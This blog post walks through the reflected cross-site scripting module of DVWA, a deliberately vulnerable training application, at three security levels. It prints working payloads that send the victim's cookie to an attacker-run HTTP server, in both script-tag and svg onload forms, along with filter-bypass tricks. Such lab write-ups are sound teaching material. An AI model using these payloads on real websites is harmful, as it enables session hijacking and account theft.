---
title: DVWA Walkthrough XI - Reflected Cross Site Scripting (XSS)
date: 2025-12-20 13:00:08 +0200
categories: [Walkthrough, DVWA]
tags: [walkthrough, dvwa, burpsuite, xss, reflected]
author: diego
description: A walkthrough of the Damn Vulnerable Web Application (DVWA) module 11, Reflected Cross Site Scripting (XSS).
image:
  path: /assets/img/posts/dvwa/dvwa.png
  alt: DVWA
---
> To further your understanding of DVWA, explore the [comprehensive DVWA walkthrough](/posts/dvwa_walkthrough/) or browse the [full DVWA series](/categories/dvwa/) to master every vulnerability level.
{: .prompt-info }

# **Reflected Cross Site Scripting (XSS)**
## What's this?
Reflected XSS occurs when an application takes user input from a request (like URL parameters) and embeds it unsafely into the immediate response, executing malicious scripts in the victim's browser. PortSwigger Academy explains this non-persistent attack tricks users into clicking crafted links that reflect payloads via search fields or error messages. In DVWA, it simulates unsafe reflection of inputs across security levels.

Reflected XSS enables session hijacking, data theft, or phishing via malicious links, compromising victim accounts without server persistence.

## Objective
The main goal of this module is to **steal the cookie of a logged in user**.

## **Security: Low**
> **Help**  
> Low level will not check the requested input, before including it to be used in the output text.
{: .prompt-tip }

> Check the source code [here](https://github.com/digininja/DVWA/blob/master/vulnerabilities/xss_r/source/low.php).
{: .prompt-info }

1. When we enter a name, it is printed both on the page and in the search bar. If we replace it with a payload such as `<script>alert('XSS')</script>`, it executes successfully.
2. Since the goal is to obtain the user’s cookie, we can use the following payload while running a Python HTTP server on our machine (`python -m http.server 8081`):
```html
<script>window.location='http://192.168.1.145:8081/?cookie='+document.cookie</script>
```
However, this payload does not work.
![Payload not working](assets/img/posts/dvwa/11_not_working.png)
3. By inspecting the HTML source, we can see that the issue is that the `+` character has been filtered out. We can bypass this by using URL encoding, where `+` becomes `%2B`. After making this substitution and retrying the payload, it works:
![RXSS Low Done](assets/img/posts/dvwa/11_low.png)

## **Security: Medium**
> **Help**  
> The developer has tried to add a simple pattern matching to remove any references to `<script>`, to disable any JavaScript.
{: .prompt-tip }

> Check the source code [here](https://github.com/digininja/DVWA/blob/master/vulnerabilities/xss_r/source/medium.php).
{: .prompt-info }

1. If we try the same payload as before, the `<script>` tags are filtered out. We can instead use a payload that does not rely on that tag, such as `<svg/onload=alert(1)>`:
![svg payload](assets/img/posts/dvwa/11_svg.png)
2. As before, we can adapt the payload to send the user’s cookie to our HTTP server:  

```html
<svg/onload=window.location='http://192.168.1.145:8081/?cookie='%2Bdocument.cookie>
```
![RXSS Medium Done](assets/img/posts/dvwa/11_medium.png)

## **Security: High**
> **Help**  
> The developer now believes they can disable all JavaScript by removing the pattern "<s\*c\*r\*i\*p\*t".
{: .prompt-tip }

> Check the source code [here](https://github.com/digininja/DVWA/blob/master/vulnerabilities/xss_r/source/high.php).
{: .prompt-info }

This security level can be exploited in the same way as the medium one. The code was only modified to enforce stricter blocking of `<script>` tags, but it still does not prevent alternative Cross-Site Scripting techniques.

## References
- [PortSwigger Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)

<br><br>
> Wanna talk? Contact me here!  
> <a href="javascript:void(0);" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" onclick="navigator.clipboard.writeText('diegofdlg@gmail.com');alert('Mail copied to the clipboard!')"><i class="fa-solid fa-envelope"></i></a>
> <a href="https://www.linkedin.com/in/diego-fidalgo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-linkedin"></i></a>
> <a href="https://x.com/0x_ch3ngo" style="font-size:1.2rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>
{: .prompt-tip }
